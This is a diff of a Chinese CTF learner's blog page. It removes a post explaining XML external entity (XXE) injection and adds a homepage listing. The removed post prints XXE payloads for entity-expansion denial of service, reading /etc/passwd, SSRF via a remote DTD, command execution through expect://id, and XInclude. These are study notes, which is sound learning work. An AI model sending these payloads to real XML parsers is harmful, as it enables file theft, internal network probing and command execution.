@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>xxe漏洞学习 | 大周&#39;blog</title>
+  <title>大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -265,169 +265,124 @@
   </div>
 </header>
 
-      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
-<div class="pattern-center-blank"></div>
-
-  <div class="pattern-center single-center">
-    <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img">
-        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200811110729.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
-      </div>
-    <header class="pattern-header single-header">
-      <h1 class="entry-title">
-      xxe漏洞学习</h1>
-      <p class="entry-census">
-        <span>
-          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
-            <img src="https://www.d1a0.cn/images/avatar.jpg">
-          </a>
-        </span>
-        <span>
-          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">d1a0</a>
-        </span>
-        <span class="bull">
-        ·</span>
-        2020-8-11
-        
-      
-        ·<span id="readcount"></span>次阅读
-      
-      </p>
-    </header>
-  </div>
-
+      <div class="blank" style="padding-top: 0px;"></div>
 <div id="content" class="site-content">
+  
+  <div class="notice" style="margin-top:60px">
+    <i class="iconfont icon-notification">
+    </i>
+    <div class="notice-content">欢迎来到大周&#39;blog！</div>
+  </div>
+  
+  <div class="top-feature-row">
+  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
+  <i class="fa fa-anchor" aria-hidden="true">
+  </i>
+  START:DASH!!</h1>
+  
+  <div class="top-feature-v2">
+    <div class="the-feature square from_left_and_right">
+      <a href="/tags/php/" target="_blank">
+        <div class="img">
+          <img src="/images/startdash/php.jpg">
+        </div>
+        <div class="info">
+          <h3>PHP</h3>
+          <p>PHP学习笔记</p>
+        </div>
+      </a>
+    </div>
+  </div>
+  
+  <div class="top-feature-v2">
+    <div class="the-feature square from_left_and_right">
+      <a href="/tags/ctf/" target="_blank">
+        <div class="img">
+          <img src="/images/startdash/ctf.jpg">
+        </div>
+        <div class="info">
+          <h3>ctf</h3>
+          <p>一些writeup</p>
+        </div>
+      </a>
+    </div>
+  </div>
+  
+  <div class="top-feature-v2">
+    <div class="the-feature square from_left_and_right">
+      <a href="/tags/代码审计/" target="_blank">
+        <div class="img">
+          <img src="/images/startdash/代码审计.jpg">
+        </div>
+        <div class="info">
+          <h3>代码审计</h3>
+          <p>代码审计学习笔记</p>
+        </div>
+      </a>
+    </div>
+  </div>
+  
+</div>
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
-        <div class="toc"></div>
-        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
-        
-        <div class="entry-content">
-          <p>前几天ctfshow的webak赛有一道利用xxe漏洞的题，当时看一些xxe的资料也没整出来，想着再学习下。</p>
-<a id="more"></a>
-
-<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
-<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>
-<h4 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code></pre><h4 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h4><p>1.内部DTD文档</p>
-<pre><code>&lt;!DOCTYPE 根元素[定义内容]&gt;</code></pre><p>2.外部DTD文档</p>
-<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></pre><p>3.内外部DTD文档结合</p>
-<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></pre><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><pre><code>&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY a0 &quot;dos&quot; &gt;
-&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
-&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
-&lt;!ELEMENT data (#ANY)&gt;
-]&gt;
-&lt;data&gt;4&lt;/data&gt;</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
-&lt;catalog&gt;
-   &lt;core id=&quot;test101&quot;&gt;
-      &lt;description&gt;&amp;xxe;&lt;/description&gt;
-   &lt;/core&gt;
-&lt;/catalog&gt;</code></pre><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
-&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
-        </div>
-        <!-- .entry-content -->
-        
-        <p></p>
-          
-        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
-        <footer class="post-footer">
-          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
-          <div class="post-tags">
-          </div>
-          <div class="post-share">
-            <div class="social-share sharehidden share-component"></div>
-            <i class="iconfont show-share icon-forward"></i>
-          </div>
-        </footer><!-- .entry-footer -->
-      </article>
-      <!-- #post-## -->
-      <div class="toc" style="background: none;"></div>
-      <section class="post-squares nextprev">
-        
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/005WQYV9gy1fqdf874afuj31hc0u0qis.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/005WQYV9gy1fqdf874afuj31hc0u0qis.jpg">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/005WQYV9gy1fqdf874afuj31hc0u0qis.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                ctfshow-web入门信息搜集</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2020/08/08/%E7%99%BD%E5%AB%96%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%9F%9F%E5%90%8D/" rel="next">
-              <div class="background">
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200808160923.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Next Post</span>
-              <div class="info">
-                <h3>
-                白嫖腾讯云服务器和域名</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-      </section>
+      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
+      <i class="fa fa-envira" aria-hidden="true"></i>
+      Discovery</h1>
       
-<div id="vcomments"></div>
-<script>
-  window.onload = function(){
-      var valine = new Valine();
-      valine.init({
-        el: '#vcomments',
-        appId: "x4KiIidzwmgCbhqx0TEtQk6W-gzGzoHsz",
-        appKey: "uavnoTMwgQJ0F9RrFiIxxgID",
-        path: window.location.pathname,
-        placeholder: "你是我一生只会遇见一次的惊喜 ..."
-      })
-  }
-</script>
+  <!-- 首页默认取最最新文章集 -->
+  
+    
+<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
 
-      <section class="author-profile">
-        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="https://www.d1a0.cn" target="_blank" rel="noopener" class="profile gravatar"><img src="https://www.d1a0.cn/images/avatar.jpg" itemprop="image" alt="d1a0" height="70" width="70"></a>
-          <div class="meta">
-            <span class="title">Author</span>
-            <h3 itemprop="name">
-            <a href="https://www.d1a0.cn" target="_blank" itemprop="url" rel="author noopener">d1a0</a>
-            </h3>
-          </div>
+  <div class="post-thumb">
+    <a href="/2019/12/05/ceshi/">
+      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/image-404.png">
+    </a>
+  </div>
+  <div class="post-content-wrap">
+    <div class="post-content">
+      <div class="post-date">
+        <i class="iconfont icon-time">
+        </i>2019-12-5 20:12</div>
+      <a href="/2019/12/05/ceshi/" class="post-title">
+        <h3>test</h3>
+      </a>
+      <div class="post-meta">
+        <span><i class="fa fa-tags"></i>
+        
+            <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建<em>·</em></a>
+          
+        </span>
+        <span>
+          <i class="iconfont icon-file"></i>
+          
+        </span>
+      </div>
+      <div class="float-content">
+        <p></p>
+        <div class="post-bottom">
+          <a href="/2019/12/05/ceshi/" class="button-normal">
+            <i class="iconfont icon-caidan"></i>
+          </a>
         </div>
-        <hr>
-        <p><i class="iconfont icon-write"></i></p>
-      </section>
-    </main><!-- #main -->
-  </div><!-- #primary -->
-</div>
+      </div>
+    </div>
+  </div>
+</article>
+  
 
+
+    </main>
+      <!-- 首页默认取最最新文章集 -->
+    <!-- 
+      <nav class="navigator">
+        
+        <a class="extend prev" rel="prev" href="/page/7/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span>
+      </nav>
+     -->
+  </div>
+  
+</div>
 
     </div>    
     <div class="ins-search">
